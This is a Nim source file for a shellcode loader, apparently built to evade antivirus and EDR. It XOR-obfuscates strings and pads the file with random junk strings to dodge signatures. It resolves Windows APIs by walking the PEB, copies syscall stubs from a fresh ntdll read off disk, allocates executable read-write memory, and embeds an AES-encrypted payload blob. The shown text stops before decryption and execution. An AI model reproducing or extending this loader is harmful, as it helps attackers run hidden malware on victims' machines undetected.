import winim/lean
#from dynlib import LibHandle, loadLib
# something seams to be still missing here
#from winim/lean import ULONG, PVOID, SIZE_T, PSIZE_T, DWORD_PTR,LPDWORD,WINBOOL,TRUE,FALSE,HMODULE,LPOVERLAPPED, PIMAGE_SECTION_HEADER, LPCSTR, LPVOID, HANDLE, DWORD, GENERIC_READ, FILE_SHARE_READ, LPSECURITY_ATTRIBUTES, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, PIMAGE_DOS_HEADER, PIMAGE_NT_HEADERS, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_FIRST_SECTION, IMAGE_SIZEOF_SECTION_HEADER, PIMAGE_EXPORT_DIRECTORY, PDWORD, BOOL, PULONG, NTSTATUS, PROCESS_ALL_ACCESS, FALSE, MEM_COMMIT, PAGE_EXECUTE_READ_WRITE, PAGE_READWRITE, CLIENT_ID, OBJECT_ATTRIBUTES
#from winim/lean import FARPROC,NtClose,VirtualAllocEx,NT_SUCCESS
#import winim/winstr
#import winim/utils
#from winim import winstr,winimbase,windef
import strformat
from nimcrypto import CTR, aes256, sizeKey, sizeBlock, sha256, digest, init, update, finish, clear, decrypt, encrypt
import strutils
import base64
import ptr_math
import strenc
when defined(Fluctuate):
    import Fluctuation

when defined(DInvoke):
    import GetPEB

var success: BOOL

proc toString(bytes: openarray[byte]): string =
  result = newString(bytes.len)
  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

### Modified code from Nim-Strenc to avoid XORing of long strings -> Modified by @chvancooten, credit to him
### Original source: https://github.com/Yardanico/nim-strenc
import macros, hashes

type
    estring = distinct string

proc calcTheThings(s: estring, key: int): string {.noinline.} =
    var k = key
    result = string(s)
    for i in 0 ..< result.len:
        for f in [0, 8, 16, 24]:
            result[i] = chr(uint8(result[i]) xor uint8((k shr f) and 0xFF))
    k = k +% 1

var eCtr {.compileTime.} = hash(CompileTime & CompileDate) and 0x7FFFFFFF

macro obf*(s: untyped): untyped =
    if len($s) < 10000:
        var encodedStr = calcTheThings(estring($s), eCtr)
        result = quote do:
            calcTheThings(estring(`encodedStr`), `eCtr`)
        eCtr = (eCtr *% 16777619) and 0x7FFFFFFF
    else:
        result = s

# Decrypt.nim
func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

var dctx: CTR[aes256]


from winim/lean import ULONG, PVOID, SIZE_T, PSIZE_T, DWORD_PTR,LPDWORD,WINBOOL,TRUE,FALSE,HMODULE,LPOVERLAPPED, PIMAGE_SECTION_HEADER, LPCSTR, LPVOID, HANDLE, DWORD, GENERIC_READ, FILE_SHARE_READ, LPSECURITY_ATTRIBUTES, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, PIMAGE_DOS_HEADER, PIMAGE_NT_HEADERS, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_FIRST_SECTION, IMAGE_SIZEOF_SECTION_HEADER, PIMAGE_EXPORT_DIRECTORY, PDWORD, BOOL, PULONG, NTSTATUS, PROCESS_ALL_ACCESS, FALSE, MEM_COMMIT, PAGE_EXECUTE_READ_WRITE, PAGE_READWRITE, CLIENT_ID, OBJECT_ATTRIBUTES
from winim import PWCHAR,PUNICODE_STRING,UNICODE_STRING,PHANDLE,LIST_ENTRY,UCHAR,BYTE,P_PEB,LPWSTR,IMAGE_NT_SIGNATURE,USHORT,IMAGE_FILE_DLL,lstrcmpiW,LPWSTR,PWSTR,RtlInitUnicodeString,ULONG_PTR,MAX_PATH,wchar_t,IMAGE_DATA_DIRECTORY,PCHAR,StrRStrIA
import winim/utils
import winim/winstr

type
  ND_LDR_DATA_TABLE_ENTRY* {.bycopy.} = object
    InMemoryOrderLinks*: LIST_ENTRY
    InInitializationOrderLinks*: LIST_ENTRY
    DllBase*: PVOID
    EntryPoint*: PVOID
    SizeOfImage*: ULONG
    FullDllName*: UNICODE_STRING
    BaseDllName*: UNICODE_STRING

  PND_LDR_DATA_TABLE_ENTRY* = ptr ND_LDR_DATA_TABLE_ENTRY
  ND_PEB_LDR_DATA* {.bycopy.} = object
    Length*: ULONG
    Initialized*: UCHAR
    SsHandle*: PVOID
    InLoadOrderModuleList*: LIST_ENTRY
    InMemoryOrderModuleList*: LIST_ENTRY
    InInitializationOrderModuleList*: LIST_ENTRY

  PND_PEB_LDR_DATA* = ptr ND_PEB_LDR_DATA
  ND_PEB* {.bycopy.} = object
    Reserved1*: array[2, BYTE]
    BeingDebugged*: BYTE
    Reserved2*: array[1, BYTE]
    Reserved3*: array[2, PVOID]
    Ldr*: PND_PEB_LDR_DATA

  PND_PEB* = ptr ND_PEB

type
  LdrLoadDll_t* = proc (PathToFile: PWCHAR, Flags: ULONG, ModuleFileName: PUNICODE_STRING, ModuleHandle: PHANDLE): NTSTATUS {.stdcall.}



when defined(WIN64):
  const
    PEB_OFFSET* = 0x30
else:
  const
    PEB_OFFSET* = 0x60


var dcltexnilxvgdocyzwibqn: string = obf("lyuursteyfjdisbzstcdgbyyotsondgnqmerixvwczlujfygaahiqhxpevkxglbwsstuepfavzurbhvxql")



const
  LdrLoadDll_SW2_HASH * = obf("LdrLoadDll")
  MZ* = 0x5A4D

const
  NTDLL_DLL* = obf("ntdll.dll")


var cbkrddjnffgaoluqgqtwu: string = obf("ssiwtzrclkxbwlpcusixqhsihfyehfrsbexbxxitxucffndqgrbqtdqoddvkeyjagafpxlfxyikvzoexhltfwxbfiroomwrczulumbnfdsjeygslwkshucczaovnykgaopgmhiytkghoqkpmpjvjunayguehvsqfmkgbgvzdcttskdzutzlzoxjqzpmngzysdpogkasajtxptboakcrwbmknfuiyttvonphw")



template RVA*(atype: untyped, base_addr: untyped, rva: untyped): untyped = cast[atype](cast[ULONG_PTR](cast[ULONG_PTR](base_addr) + cast[ULONG_PTR](rva)))

template RVA2VA(casttype, dllbase, rva: untyped): untyped =
  cast[casttype](cast[ULONG_PTR](dllbase) + rva)

proc `+`[T](a: ptr T, b: int): ptr T =
    cast[ptr T](cast[uint](a) + cast[uint](b * a[].sizeof))

proc `-`[T](a: ptr T, b: int): ptr T =
    cast[ptr T](cast[uint](a) - cast[uint](b * a[].sizeof))


proc is_dll*(hLibrary: PVOID): BOOL
proc get_library_address*(LibName: LPWSTR; DoLoad: BOOL): HANDLE
proc get_function_address*(hLibrary: HMODULE; fhash: cstring; ordinal: int, specialCase: BOOL): PVOID
proc find_legacy_export*(hOriginalLibrary: HMODULE; fhash: cstring): PVOID


var uvjpctdfick: string = obf("qshorylglgdmsszwhwkqmohavumbfiwxedbsfwobbxnyrcfdgqrwyjtfxkqiyzjpiomvbergflmzcl")



proc is_dll*(hLibrary: PVOID): BOOL =
  #echo "IS_DLL start"
  var dosHeader: PIMAGE_DOS_HEADER
  var ntHeader: PIMAGE_NT_HEADERS
  if (hLibrary == nil):
    when defined(verbose):
        echo "[-] hLibrary == 0, exiting"
    return FALSE
  dosHeader = cast[PIMAGE_DOS_HEADER](hLibrary)
  #echo "Got dos Header"
  ##  check the MZ magic bytes
  if dosHeader.e_magic != MZ:
    when defined(verbose):
        echo "[-] No Magic bytes found"
    return FALSE
  #nt = RVA(PIMAGE_NT_HEADERS, hLibrary, dosHeader.e_lfanew)
  ntHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](hLibrary) + dosHeader.e_lfanew)
  #echo "Got NT Headers"
  ##  check the NT_HEADER signature
  if ntHeader.Signature != IMAGE_NT_SIGNATURE:
    when defined(verbose):
        echo "[-] Nt Header signature wrong, exiting"
    return FALSE
  var Characteristics: USHORT = ntHeader.FileHeader.Characteristics
  if (Characteristics and IMAGE_FILE_DLL) != IMAGE_FILE_DLL:
    when defined(verbose):
        echo "[-] Characteristics shows this is not an DLL, exiting"
    return FALSE
  #echo "Everything fine, this is indeed a DLL"
  return TRUE


##
##  Get the base address of a DLL
##

var kheuvnkjwsmzqtdcoxutreuuqv: string = obf("yhbfcvtrrlxikrmdntdmtkqoawdzvqikrojmrhgrfehgztlocpvgcflgkxdy")




proc get_library_address*(LibName: LPWSTR; DoLoad: BOOL): HANDLE =
  when defined(verbose):
      echo "\r\n[*] Parsing the PEB to search for the target DLL\r\n"
  var Peb: PPEB = GetPPEB(PEB_OFFSET)
  var Ldr = Peb.Ldr
  var FirstEntry: PVOID = addr(Ldr.InMemoryOrderModuleList.Flink)
  var Entry: PND_LDR_DATA_TABLE_ENTRY = cast[PND_LDR_DATA_TABLE_ENTRY](Ldr.InMemoryOrderModuleList.Flink)
  while true:
    var compare: int = lstrcmpiW(LibName,cast[LPWSTR](Entry.BaseDllName.Buffer))
    if(compare == 0):
      when defined(verbose):
          echo "\r\n[+] Found the DLL!\r\n"
      return cast[HANDLE](Entry.DllBase)
    Entry = cast[PND_LDR_DATA_TABLE_ENTRY](Entry.InMemoryOrderLinks.Flink)
    if not (Entry != FirstEntry):
      when defined(verbose):
          echo "DLL not found for the current proc, loading."
      break
  if (DoLoad == FALSE):
    when defined(verbose): echo "Exit, loading is not appreciated"
    return 0
  
  var yhacavxubezgqjlbug: string = obf("cxkdtoeffpcdomtmphbanaymhrfaybvrkdnpimolzjvratvjqiogcfreczqevwiijigbbsuzlvxmoofeuysnoyoneewxwkubkkiittpuyenehmmsfojyehqfvqrqadyiiwgsjyygttcwcvfahdplvegsbfkxfuupsfgocduhhorazatyxvtbydqcxoywybd")


  var MyLdrLoadDll: LdrLoadDll_t = cast[LdrLoadDll_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(NTDLL_DLL, FALSE)), LdrLoadDll_SW2_HASH, 0, TRUE)))
  
  if MyLdrLoadDll == nil:
    when defined(verbose): echo "[-] Address of LdrLoadDll not found"
    return 0

  var ModuleFileName: UNICODE_STRING
  
  var hLibrary: HANDLE = 0



  RtlInitUnicodeString(&ModuleFileName, LibName)
  #echo fmt"Copyied {LibName} into {ModuleFileName} "
  #echo "Error after:", $GetLastError()
  
  ##  load the library
  var status: NTSTATUS = MyLdrLoadDll(nil, 0, &ModuleFileName, &hLibrary)
  
  if (status != 0):
    when defined(verbose): echo fmt"[-] Failed to load {Libname}, status: {status}\n"
    if (hLibrary == 0):
        when defined(verbose): echo "HLibrary still null"
    return 0
  else:
    when defined(verbose): echo fmt"Loaded {LibName} successfully!"
  when defined(verbose): echo fmt"[+] Loaded {LibName} at {hLibrary}"
  return hLibrary

##
##  Find an export in a DLL
##

var yeallopjftearcg: string = obf("issbznxvasguoqgrpnjuwjsvjtzyclsrrpbesquvyibkjccroyloumaygjqlggyporsrjyeiuimmwgbmanidnssgfzvalbihavdbognfzubzecpsjtq")



proc get_function_address*(hLibrary: HMODULE; fhash: cstring; ordinal: int, specialCase: BOOL): PVOID =
  var dos: PIMAGE_DOS_HEADER
  var nt: PIMAGE_NT_HEADERS
  #var data: PIMAGE_DATA_DIRECTORY
  var data: array[0..15, IMAGE_DATA_DIRECTORY]
  var exp: PIMAGE_EXPORT_DIRECTORY
  var exp_size: DWORD
  var adr: PDWORD
  var ord: PDWORD
  var functionAddress: PVOID
  var toCheckLibrary: PVOID = cast[PVOID](hLibrary)
  if (is_dll(toCheckLibrary) == FALSE):
    when defined(verbose): echo "[-] Exiting, not a DLL"
    return nil
  dos = cast[PIMAGE_DOS_HEADER](hLibrary)
  nt = RVA(PIMAGE_NT_HEADERS, cast[PVOID](hLibrary), dos.e_lfanew)
  
  data = nt.OptionalHeader.DataDirectory
  
  if (data[0].Size == 0 or data[0].VirtualAddress == 0):
    when defined(verbose): echo "[-] Data size == 0 or no VirtualAddress"
    return nil
  exp = RVA(PIMAGE_EXPORT_DIRECTORY, hLibrary, data[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)
  exp_size = data[0].Size

  adr = RVA2VA(PDWORD, cast[DWORD_PTR](hLibrary), exp.AddressOfFunctions)
  ord = RVA2VA(PDWORD, cast[DWORD_PTR](hLibrary), exp.AddressOfNameOrdinals)
  
  functionAddress = nil
  
  var adsvkdepyslrounejiosbdocx: string = obf("bkbbcrlpmokvrarabgjanwwarapxafasideefcwhdltnwpgywyutcmngjoncrkhulbglxjxqdpupiavmxhciztwhhusqufqpofhxldwwvddpedeiyojfyflewmokyvkadxjbdkrwxzrfsbcptinkf")


  var numofnames = cast[DWORD](exp.NumberOfNames)
  var functions = RVA2VA(PDWORD, cast[PVOID](hLibrary), exp.AddressOfFunctions)
  #var ordinalbase: DWORD = exp.AddressOfFunctions + 0x10
  #var ordinalsRVA: DWORD = exp.AddressOfFunctions + 0x24
  var addressOfFunctionsvalue = RVA2VA(PDWORD, cast[PVOID](hLibrary), exp.AddressOfFunctions)[]
  var names = RVA2VA(PDWORD, cast[PVOID](hLibrary), exp.AddressOfNames)[]

  when defined(verbose): echo "\r\n[*] Checking DLL's Export Directory for the target function\r\n"

  if fhash != "":
    ##  iterate over all the exports
    #var i: DWORD = 0

    for i in 0 .. numofnames:
      # Getting the function name value
      var funcname = RVA2VA(cstring, cast[PVOID](hLibrary), names)
      #echo funcname
      var finalfunctionAddress = RVA(PVOID, cast[PVOID](hLibrary), addressOfFunctionsvalue)
      
      # We are comparing against function names, which include "." because for some reason all function names in this loop also contain references to other DLLs, e.g. "api-ms-win-core-libraryloader-l1-1-0.AddDllDirectory" in kernel32.dll
      var test = StrRStrIA(cast[LPCSTR](funcname),nil,cast[LPCSTR]("."))

      if test != nil:
        # As we found a trash (indirect reference, normally this is in the address field and not in the names field) function, we have to increase this value -> Not an official function
        numofnames = numofnames + 1
      else:
        functions = functions + 1
        addressOfFunctionsvalue = functions[]
      #when defined(verbose): echo "Relative Address: ", toHex(functions[])
      names += cast[DWORD](len(funcname) + 1)
      #when defined(verbose): echo "Function: ", funcname
      if fhash == funcname:
        
        # So many edge cases, have to investigate
        if (funcname == obf("CreateFileW")):
          functions = functions - 1
        if (funcname == obf("SetFileInformationByHandle")):
          functions = functions - 1
        if (funcname == obf("CloseHandle")):
          functions = functions - 1
        if (funcname == obf("GetModuleFileNameW")):
          functions = functions - 1
        if (funcname == obf("GetConsoleWindow")):
          functions = functions - 1
        if (funcname == obf("ShowWindow")):
          functions = functions + 4
        when defined(verbose): echo "\r\n[+] Found API call: ",funcname
        when defined(verbose): echo "\r\n"
        # Strange. For ntdll functions the following is needed, but for kernel32 functions it's not. Don't ask me why. This is a workaround for the moment. Need to troubleshoot.
        if (specialCase):
          # Why?
          when defined(verbose): echo "This is a special case, subtract one function"
          finalfunctionAddress = RVA(PVOID, cast[PVOID](hLibrary), addressOfFunctionsvalue)
        when defined(verbose): echo "Relative Address: ", toHex(functions[])
        functions = functions - 1
        when defined(verbose): echo "Relative Address one before: ", toHex(functions[])
        functions = functions + 2
        when defined(verbose): echo "Relative Address one after: ", toHex(functions[])
        functionAddress = finalfunctionAddress
        break
  else:
    # Add the ordinal number e.g. 1034 for OpenProcess and - the EXP Base address
    when defined(verbose): echo fmt"Getting address via ordinal"
    functions = functions + ordinal - 1
    functionAddress = RVA(PVOID, hLibrary, functions[])
    when defined(verbose): echo "Relative Address: ", toHex(functions[])
    #echo "Function address via ordinal:"
    #echo repr(functionAddress)
    
  var wltxcjsznhoezugcshajvwug: string = obf("vcgffzskdrgdawxxlluaiygpebyqanrgcdvufhtyhynhoyksafgaamzxaxrqfuytjqhbocjjrkzpnc")


  if functionAddress == nil:
    return nil
  else:
    return functionAddress

##
##  Look among all loaded DLLs for an export with certain function hash
##

# Not verified working yet
proc find_legacy_export*(hOriginalLibrary: HMODULE; fhash: cstring): PVOID =
  var functionAddress: PVOID
  var Peb: PPEB = GetPPEB(PEB_OFFSET)
  #var Peb: PPEB = GetPEB()
  
  var rzqnemtzoeokgeupppjfqv: string = obf("lexovbcbirratzxysryzruupetcogiomorhntabujmqpfnztcuazkestbxnzvwictbrzifcokkpscdpsqttgajbtmztexbjotvuqjvcselzytinxyshymuouehuxhsjargpimkviddiqmjuxpobwmwvovpydpelictbzozqydzkmbybkrcwrmfbisilabiukbwuadyogrtqrhcdyylwypifif")


  var Ldr = Peb.Ldr
  var FirstEntry: PVOID = addr(Ldr.InMemoryOrderModuleList.Flink)
  var Entry: PND_LDR_DATA_TABLE_ENTRY = cast[PND_LDR_DATA_TABLE_ENTRY](Ldr.InMemoryOrderModuleList.Flink)
  while Entry != FirstEntry:
    ##  avoid looking in the DLL that brought us here
    if Entry.DllBase == cast[PVOID](hOriginalLibrary):
      Entry = cast[PND_LDR_DATA_TABLE_ENTRY](Entry.InMemoryOrderLinks.Flink)
      continue
    functionAddress = get_function_address(cast[HMODULE](Entry.DllBase), fhash, 0, FALSE)
    if functionAddress == nil:
      Entry = cast[PND_LDR_DATA_TABLE_ENTRY](Entry.InMemoryOrderLinks.Flink)
      continue
    return functionAddress
    Entry = cast[PND_LDR_DATA_TABLE_ENTRY](Entry.InMemoryOrderLinks.Flink)
  return nil


const
  KERNEL32_DLL* = obf("kernel32.dll")

type
  GetCurrentProcess_t* = proc (): DWORD {.stdcall.}
  GetCurrentProcessId_t* = proc (): DWORD {.stdcall.}
  VirtualAllocEx_t* = proc (hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD): LPVOID {.stdcall.}
  OpenProcess_t* = proc (dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, dwProcessId: DWORD): HANDLE {.stdcall.}
  VirtualProtect_t* = proc (lpAddress: LPVOID, dwSize: SIZE_T, flNewProtect: DWORD, lpflOldProtect: PDWORD): WINBOOL {.stdcall.}

const
  GetCurrentProcessId_HASH * = obf("GetCurrentProcessId")
  VirtualAllocEx_HASH * = obf("VirtualAllocEx")
  GetCurrentProcess_HASH * = obf("GetCurrentProcess")
  OpenProcess_HASH * = obf("OpenProcess")
  VirtualProtect_HASH * = obf("VirtualProtect")

var MyGetCurrentProcess*: GetCurrentProcess_t
var MyVirtualAllocEx*: VirtualAllocEx_t
var MyGetCurrentProcessId*: GetCurrentProcessId_t
var MyOpenProcess*: OpenProcess_t
var MyVirtualProtect*: VirtualProtect_t

MyGetCurrentProcess = cast[GetCurrentProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetCurrentProcess_HASH, 0, FALSE)))

MyGetCurrentProcessId = cast[GetCurrentProcessId_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetCurrentProcessId_HASH, 0, FALSE)))

MyVirtualProtect = cast[VirtualProtect_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualProtect_HASH, 0, FALSE))

MyOpenProcess = cast[OpenProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenProcess_HASH, 0, FALSE)))

var uicrcnqtppgqvsvefe: string = obf("wlmnfisnipevrbumpebcbfuatbkbprpauvmtelbcomjduookpzdhcinygogpaemxjsjugqixeaqtljoygjmefurlyimdidsdybfggdzzmochfszxopjkghuooksmiwfulqxbnglkoxdyiigbcpibznkvfesugfldlpjshgrfcvxxljdprxmjduzuddjottialkzpsmvogssggptbrfwpoaesxdu")


var ichxakjgazrctocrmlrg: string = obf("gjmpmmxvmaoedzmreptwvrzttdfautlasqtzwmuuywbilxomoflynkjotaefsltnbftjwyltpidynmbehgqckqplbfazdmfbbpibxhpphmljfmy")


when defined(GetSyscallStub):
    type
      PS_ATTR_UNION* {.pure, union.} = object
        Value*: ULONG
        ValuePtr*: PVOID
      PS_ATTRIBUTE* {.pure.} = object
        Attribute*: ULONG 
        Size*: SIZE_T
        u1*: PS_ATTR_UNION
        ReturnLength*: PSIZE_T
      PPS_ATTRIBUTE* = ptr PS_ATTRIBUTE
      PS_ATTRIBUTE_LIST* {.pure.} = object
        TotalLength*: SIZE_T
        Attributes*: array[2, PS_ATTRIBUTE]
      PPS_ATTRIBUTE_LIST* = ptr PS_ATTRIBUTE_LIST
      KNORMAL_ROUTINE* {.pure.} = object
        NormalContext*: PVOID
        SystemArgument1*: PVOID
        SystemArgument2*: PVOID
      PKNORMAL_ROUTINE* = ptr KNORMAL_ROUTINE
    
    var 
        SYSCALL_STUB_SIZE: int = 23
    
    
    type
      CreateFileA_t* = proc (lpFileName: LPCSTR, dwDesiredAccess: DWORD, dwShareMode: DWORD, lpSecurityAttributes: LPSECURITY_ATTRIBUTES, dwCreationDisposition: DWORD, dwFlagsAndAttributes: DWORD, hTemplateFile: HANDLE): HANDLE {.stdcall.}
      GetFileSize_t* = proc (hFile: HANDLE, lpFileSizeHigh: LPDWORD): DWORD {.stdcall.}
      RtlAllocateHeap_t* = proc (HeapHandle: PVOID, Flags: ULONG, Size: SIZE_T): PVOID {.stdcall.}
      GetProcessHeap_t* = proc (): HANDLE {.stdcall.}
      ReadFile_t* = proc (hFile: HANDLE, lpBuffer: LPVOID, nNumberOfBytesToRead: DWORD, lpNumberOfBytesRead: LPDWORD, lpOverlapped: LPOVERLAPPED): WINBOOL {.stdcall.}
      
    const
      CreateFileA_HASH * = obf("CreateFileA")
      GetFileSize_HASH * = obf("GetFileSize")
      RtlAllocateHeap_HASH * = obf("RtlAllocateHeap")
      GetProcessHeap_HASH * = obf("GetProcessHeap")
      ReadFile_HASH * = obf("ReadFile")
    when defined(DInvoke):  
        var MyCreateFileA*: CreateFileA_t
        var MyGetFileSize*: GetFileSize_t
        var MyRtlAllocateHeap*: RtlAllocateHeap_t
        var MyGetProcessHeap*: GetProcessHeap_t
        var MyReadFile*: ReadFile_t
    
    when defined(DInvoke):
        MyCreateFileA = cast[CreateFileA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), CreateFileA_HASH, 0, FALSE)))
        MyGetFileSize = cast[GetFileSize_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetFileSize_HASH, 0, FALSE)))
        MyRtlAllocateHeap = cast[RtlAllocateHeap_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(NTDLL_DLL, FALSE)), RtlAllocateHeap_HASH, 0, TRUE)))
        MyGetProcessHeap = cast[GetProcessHeap_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetProcessHeap_HASH, 0, FALSE)))
        MyReadFile = cast[ReadFile_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), ReadFile_HASH, 0, FALSE)))
    
    proc RVAtoRawOffset(RVA: DWORD_PTR, section: PIMAGE_SECTION_HEADER): PVOID =
        return cast[PVOID](RVA - section.VirtualAddress + section.PointerToRawData)
    
    proc GetSyscallStub(functionName: cstring, syscallStub: LPVOID): BOOL =
        var
            file: HANDLE
            fileSize: DWORD
            bytesRead: DWORD
            fileData: PVOID
            ntdllString: LPCSTR = obf("C:\\windows\\system32\\ntdll.dll")
            nullHandle: HANDLE
        when defined(DInvoke):
            file = MyCreateFileA(ntdllString, cast[DWORD](GENERIC_READ), cast[DWORD](FILE_SHARE_READ), cast[LPSECURITY_ATTRIBUTES](NULL), cast[DWORD](OPEN_EXISTING), cast[DWORD](FILE_ATTRIBUTE_NORMAL), nullHandle)
            fileSize = MyGetFileSize(file, nil)
            fileData = MyRtlAllocateHeap(cast[PVOID](MyGetProcessHeap()), 0, cast[SIZE_T](fileSize))
            let success = MyReadFile(file, fileData, fileSize, addr bytesRead, nil)
        else:
            file = CreateFileA(ntdllString, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullHandle)
            fileSize = GetFileSize(file, nil)
            fileData = RtlAllocateHeap(cast[PVOID](GetProcessHeap()), 0, cast[SIZE_T](fileSize))
            let success = ReadFile(file, fileData, fileSize, addr bytesRead, nil)
        var
            dosHeader: PIMAGE_DOS_HEADER = cast[PIMAGE_DOS_HEADER](fileData)
            imageNTHeaders: PIMAGE_NT_HEADERS = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](fileData) + dosHeader.e_lfanew)
            exportDirRVA: DWORD = imageNTHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
            section: PIMAGE_SECTION_HEADER = IMAGE_FIRST_SECTION(imageNTHeaders)
            textSection: PIMAGE_SECTION_HEADER = section
            rdataSection: PIMAGE_SECTION_HEADER = section
    
        let low: uint16 = 0
    
        for Section in low ..< imageNTHeaders.FileHeader.NumberOfSections:
            var ntdllSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(imageNTHeaders)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
            if obf(".rdata") in toString(ntdllSectionHeader.Name):
                rdataSection = ntdllSectionHeader
            
        var exportDirectory: PIMAGE_EXPORT_DIRECTORY = cast[PIMAGE_EXPORT_DIRECTORY](RVAtoRawOffset(cast[DWORD_PTR](fileData) + exportDirRVA, rdataSection))
    
        var addressOfNames: PDWORD = cast[PDWORD](RVAtoRawOffset(cast[DWORD_PTR](fileData) + cast[DWORD_PTR](exportDirectory.AddressOfNames), rdataSection))
        var addressOfFunctions: PDWORD = cast[PDWORD](RVAtoRawOffset(cast[DWORD_PTR](fileData) + cast[DWORD_PTR](exportDirectory.AddressOfFunctions), rdataSection))
        var stubFound: BOOL = 0
        var oldProtection: DWORD = 0
        let low2: int = 0
        for low2 in 0 ..< exportDirectory.NumberOfNames:
            var functionNameVA: DWORD_PTR = cast[DWORD_PTR](RVAtoRawOffset(cast[DWORD_PTR](fileData) + addressOfNames[low2], rdataSection))
            var functionVA: DWORD_PTR = cast[DWORD_PTR](RVAtoRawOffset(cast[DWORD_PTR](fileData) + addressOfFunctions[low2 + 1], textSection))
            var functionNameResolved: cstring = cast[cstring](functionNameVA)
            if (functionNameResolved == functionName):
                copyMem(syscallStub, cast[LPVOID](functionVA), SYSCALL_STUB_SIZE)
                stubFound = 1
        return stubFound

var hProcess: HANDLE
when defined(DInvoke):
    hProcess = MyGetCurrentProcess()
    
    let tProcess2 = MyGetCurrentProcessId()

    var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
    var syscallStub_NtProtect: LPVOID

    MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
    syscallStub_NtProtect = MyVirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
else:
    hProcess = GetCurrentProcess()
    let tProcess2 = GetCurrentProcessId()
    var pHandle2: HANDLE = OpenProcess(cast[DWORD](PROCESS_ALL_ACCESS), cast[WINBOOL](FALSE), tProcess2)
    var syscallStub_NtProtect: LPVOID
    syscallStub_NtProtect = VirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)

var egzlfwafnlcy: string = obf("riaderporzbxdzuobmoknylajqigbkflpbxfqqhjimisrvvmpnrjddgzlvpolitoosjxlqxwjnomjnyttuafwkbsfdsgmbkyynbuqhnvkmgpiuzwnpdipegjhkxdnwvwnplbfkinsaoiykiiiytkoznpuhljyyuphpwxsatcqczeycrptwissckfoeebvgvalkezekhjrkrmvikumossthmstmdcueftrbywintzudykpcqooualqf")

# Unmanaged NTDLL Declaration
type myNtProtectVirtM = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.stdcall.}

var NtProtectVirtualMemory: proc(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.stdcall.}

# Unmanaged NTDLL Declaration
type myNtWriteVirtM = proc (ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}

var NtWriteVirtualMemory: proc (ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}


var whtybzobjrkoollylaet: string = obf("rpimaxjcaoubbfxepcrxejcwuefeviswqovrluivkeprgymgstmbeogrvpuhmaqrwlgeovtspadgqzrcruqmogctfjepuuurhgvxxdlzewkxjkyqthuprdswcrqnwzjbirwlnowseaahbnulzabrslevgyyscuchvphswcybmmzgsaqjkabfjlrysifajoarvytybkjdcpiwaohacmdcpfwpwcxydygsliftwyfqwtolgrcipnhqyiwaunazdhnmrjdskbjfucwxaomjgmeuvziiizqsxdapeilutqbivybjworpyknbidyaunccdvlyycbwsdbskbczzuclpmftvdekjntbmtk")

const encstring = slurp"enc.blob"


var kuyfpwwqrkcanbcqasppa: string = obf("uwrujfiqijdvpcwjrhhuddtcpqsjrqokomlktjanhzvbegjpasotaryiuezhzjswrxsfkzxlfycrwinkbcutlesxonmflphcgrlpdgqwtyen")

var enctext: seq[byte] = toByteSeq(encstring)

var qjjjelbzbdqyuid: string = obf("apxawzclccahegguvuwydlmtssebbzmhykuhcwgkfwqdsmywwavrpuwxhmideolotqdeggxuzagjnbuflvdjwzgaqpprxobewucbikvvecousvpnjxjncllkzmncsvuzxbptalvhwriimjueyiayajgldiwzbuuwzehcfmvxdzembypdaiqldjzotuztgdgclnvcbmxdceteqxonhjngzhhdbiogkgpz")


var key: array[aes256.sizeKey, byte]

